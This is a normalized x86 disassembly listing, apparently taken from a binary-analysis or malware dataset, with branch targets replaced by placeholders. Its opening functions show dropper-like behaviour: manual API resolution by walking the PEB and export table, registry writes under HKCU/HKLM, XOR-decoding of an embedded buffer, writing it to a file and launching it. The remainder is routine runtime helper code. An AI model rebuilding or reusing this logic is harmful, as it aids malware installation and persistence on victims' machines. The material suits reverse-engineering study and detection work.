mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_448f70
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_448f70
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
push 0xfb18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_4490a0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0xfb18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_448f70
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_4490a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jge rwxdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x64
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
xor eax 0x80be78ab
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx ] al
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x1 ]
cmp edx 0x7d
jne rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
cmp ecx 0x77
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x6 ]
cmp eax 0x61
jne rwxdata
mov ecx [ ebp - 0x4 ]
add ecx 0x3e4
mov [ ebp - 0x4 ] ecx
sub_449130
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_449160
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_401000
mov eax ecx
mov [ eax + 0x4 ] 0x0
mov [ eax ] 0x0
retn
sub_401010
retn
sub_401020
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x0
retn 0x4
sub_401040
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ ecx ]
mov [ eax ] ecx
retn 0x4
sub_401060
mov edx [ esp + 0x8 ]
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
retn 0x8
sub_401080
mov eax ecx
xor ecx ecx
mov edx eax
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
mov [ edx + 0x14 ] ecx
retn
sub_4010a0
mov eax [ ecx + 0x4 ]
retn
sub_4010b0
mov eax [ rw-data ]
push eax
push ecx
call [ Ordinal_ATL71_66@IAT ]
retn
sub_4010c0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
mov [ esi + 0x4 ] eax
call j_sub_42e3bc
mov [ esi ] eax
add esp 0x4
mov eax esi
pop esi
retn 0x4
sub_4010e0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
push eax
call ??_V@YAXPAX@Z
pop ecx
sub_4011b0
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_4011f0
retn
sub_401200
mov eax ecx
mov ecx [ esp + 0x4 ]
cmp eax ecx
je r-xdata
retn 0x4
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
sub_401220
mov eax ecx
mov [ eax + 0x4 ] 0x0
mov [ eax ] 0x0
retn
sub_401230
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ ecx ]
mov [ eax ] ecx
retn 0x4
j_sub_4010f0
jmp sub_4010f0
sub_401260
mov eax ecx
mov [ eax + 0x4 ] 0x0
mov [ eax ] 0x0
retn
sub_401270
retn
sub_401280
lea eax [ esp + 0x4 ]
cmp ecx eax
mov [ ecx + 0x8 ] 0x0
je r-xdata
retn 0x8
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
sub_4012a0
mov edx [ ecx + 0x4 ]
mov eax [ esp + 0x8 ]
mov ecx [ ecx ]
lea eax [ eax + eax * 2 ]
lea edx [ edx + eax * 4 ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
retn 0x8
sub_4012c0
mov edx [ ecx ]
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
retn 0x4
sub_4016e0
mov eax 0x1
retn
sub_4016f0
mov eax rw-data
retn
sub_401700
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
sub_401720
mov [ ecx ] r--data
add ecx 0x4
push ecx
call [ DeleteCriticalSection@IAT ]
retn
sub_401b40
cmp [ ecx ] 0x0
jne r-xdata
jmp [ ecx + 0x14 ]
xor eax eax
retn 0x8
sub_401b70
retn
__imp_InterlockedExchange
jmp [ InterlockedExchange@IAT ]
sub_401c10
mov eax 0x3
retn
sub_401c90
jmp [ rw-data ]
sub_401ca0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] 0x0
mov [ eax ] ecx
retn 0x4
sub_401cc0
mov eax [ ecx + 0x8 ]
retn
sub_401cd0
mov eax ecx
mov [ eax + 0x4 ] 0x0
mov [ eax ] 0x0
retn
sub_401ce0
retn
sub_401cf0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x0
retn 0x4
sub_401d10
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_401d40
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
push eax
call sub_401d20
and eax 0xffff
or eax 0x80070000
sub_401d60
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ ecx ]
mov [ eax ] ecx
retn 0x4
sub_401d80
mov eax [ ecx ]
add ecx 0x4
cmp eax ecx
je r-xdata
retn
push eax
call [ free@IAT ]
pop ecx
sub_401da0
mov eax [ ecx ]
retn
sub_401db0
mov eax [ ecx ]
add ecx 0x4
cmp eax ecx
je r-xdata
retn
push eax
call [ free@IAT ]
pop ecx
sub_401dd0
mov eax [ ecx ]
retn
sub_401ec0
mov eax [ ecx + 0x4 ]
retn
sub_401ed0
mov eax [ ecx ]
retn
sub_401fa0
push esi
mov esi ecx
call sub_401f40
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_402110
mov eax ecx
mov [ eax + 0x4 ] 0x0
mov [ eax ] 0x0
retn
sub_402120
retn
sub_402130
lea eax [ esp + 0x4 ]
cmp ecx eax
mov [ ecx + 0x8 ] 0x0
je r-xdata
retn 0x8
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
sub_402150
mov eax [ ecx + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ ecx ]
lea edx [ eax + edx * 8 ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
retn 0x8
sub_402170
mov edx [ ecx ]
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
retn 0x4
sub_4022d0
push esi
mov esi ecx
mov [ esi ] 0x0
call sub_401ff0
mov eax esi
pop esi
retn
sub_402e70
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x3c ]
call sub_401f40
mov eax r-xdata
retn
sub_403030
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
xor eax eax
mov ecx 0x4
[ esi ] [ edi ]
pop edi
sete al
pop esi
retn
sub_403050
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call sub_42cc10
mov [ esi ] eax
mov eax esi
pop esi
retn 0x4
sub_403120
mov eax ecx
retn
j_sub_42e3bc#2
jmp sub_42e3bc
sub_403170
mov eax [ ecx ]
push eax
call [ SysFreeString@IAT ]
retn
sub_4032b0
mov eax [ esp + 0x4 ]
mov [ ecx + 0x14 ] eax
retn 0x4
sub_4032c0
mov eax [ esp + 0x4 ]
mov edx [ eax ]
add ecx 0x18
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0xc ] eax
retn 0x4
sub_4032e0
mov eax [ esp + 0x4 ]
mov [ ecx + 0x2c ] eax
retn 0x4
sub_40334d
mov eax sub_403353
retn
sub_403353
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4033d6
mov eax r-xdata
retn
sub_403456
mov eax r-xdata
retn
sub_4034ac
mov eax sub_4034b2
retn
sub_4034b2
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403740
xor eax eax
retn 0x8
sub_403750
xor eax eax
retn 0x8
sub_403760
mov eax ecx
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
retn
sub_4037c0
mov eax [ ecx ]
test eax eax
jne r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
retn
push 0x80004003
call sub_42cee0
retn
sub_4037e0
mov eax ecx
retn
sub_403820
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
push edx
call [ Ordinal_ATL71_11@IAT ]
mov [ esi + 0x28 ] 0xfefefefe
pop esi
retn 0x8
sub_403850
mov eax ecx
mov [ eax ] 0x0
retn
sub_403860
mov eax [ ecx ]
retn
sub_403890
mov eax ecx
mov [ eax ] 0x0
retn
sub_4038a0
mov eax [ ecx ]
retn
sub_4038d0
mov eax [ ecx ]
add ecx 0x4
cmp eax ecx
je r-xdata
retn
push eax
call [ free@IAT ]
pop ecx
sub_4038f0
mov eax [ ecx ]
retn
sub_403900
mov eax ecx
mov [ eax ] 0x0
retn
sub_403910
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
retn
push 0x80004003
call sub_42cee0
sub_403930
mov eax ecx
mov [ eax ] 0x0
retn
sub_403940
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
retn
push 0x80004003
call sub_42cee0
sub_403960
mov eax [ ecx ]
retn
sub_403970
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ InterlockedIncrement@IAT ]
sub_403980
mov eax ecx
mov [ eax ] 0x0
retn
sub_403990
mov eax [ ecx ]
retn
sub_4039a0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4039b0
mov eax ecx
mov [ eax ] 0x0
retn
sub_4039c0
mov eax [ ecx ]
retn
sub_4039d0
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
retn
push 0x80004003
call sub_42cee0
sub_4039f0
mov eax ecx
retn
sub_403a00
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_403a10
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_403a20
mov eax ecx
retn
sub_403a60
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_403b00
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_403b40
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_403b50
mov eax ecx
add [ eax ] 0x8
retn
sub_403b60
mov eax [ ecx ]
retn
sub_403b70
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_403b80
mov eax ecx
mov [ eax ] 0x0
retn
sub_403b90
mov eax [ ecx ]
retn
sub_403bd0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_403be0
mov eax r--data
retn
sub_403bf0
mov eax ecx
retn 0x4
sub_403c00
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_403c10
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_403c20
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_403c30
mov eax 0x1fffffff
retn
sub_403c40
mov eax [ esp + 0x4 ]
lea ecx [ eax * 8 ]
push ecx
call sub_42e3bc
add esp 0x4
retn
sub_403c60
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_403c70
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_403c80
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_403c90
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_403ca0
mov eax ecx
mov [ eax ] 0x0
retn
sub_403cb0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_403cc0
push ecx
mov al [ esp + 0x3 ]
pop ecx
retn
sub_403cd0
mov eax ecx
mov [ eax ] 0x0
retn
sub_403ce0
xor eax eax
retn
sub_403cf0
xor eax eax
retn
sub_403d00
retn 0x4
sub_403d10
retn
sub_403d20
retn
sub_403dd0
mov eax ecx
retn
sub_403de0
mov eax ecx
mov [ eax ] 0x0
retn
sub_403df0
mov eax ecx
retn
sub_403e00
mov edx [ esp + 0x8 ]
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
retn 0x8
sub_403e20
mov eax [ ecx ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov eax 0x1
retn 0x8
mov ecx [ ecx + 0x4 ]
cmp ecx [ esp + 0x8 ]
jne r-xdata
xor eax eax
retn 0x8
sub_403e40
mov eax ecx
retn
sub_403e50
mov edx [ esp + 0x8 ]
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
retn 0x10
sub_403e70
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
retn
sub_403e80
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x4 ]
retn
sub_403e90
mov edx [ ecx + 0xc ]
mov eax [ ecx ]
push esi
sub edx [ ecx + 0x4 ]
mov esi [ ecx + 0x8 ]
sub esi eax
mov eax [ esp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
pop esi
retn 0x4
sub_403f70
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
sub_403f80
push esi
mov esi ecx
call sub_403f10
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_404000
push esi
mov esi ecx
call sub_404020
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_404060
mov eax ecx
mov [ eax ] 0x0
retn
sub_404070
retn
sub_404080
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_4042d0
mov eax [ ecx ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax ]
retn
sub_4042e0
mov eax [ ecx ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax ]
retn
sub_404320
mov eax ecx
retn
sub_4044f0
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
push eax
lea ecx [ esi + 0x14 ]
push ecx
push edx
call [ Ordinal_ATL71_11@IAT ]
mov [ esi + 0x28 ] 0xfefefefe
pop esi
retn 0x4
sub_404520
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_404530
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_404540
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov eax esi
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_404560
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_404570
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov eax esi
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4045c0
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
lea eax [ esi + 0x4 ]
push ecx
mov ecx esi
mov [ esi ] eax
call sub_403a70
mov eax esi
pop esi
retn 0x4
sub_4045e0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4045f0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov eax esi
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_404640
mov eax [ ecx ]
test eax eax
je r-xdata
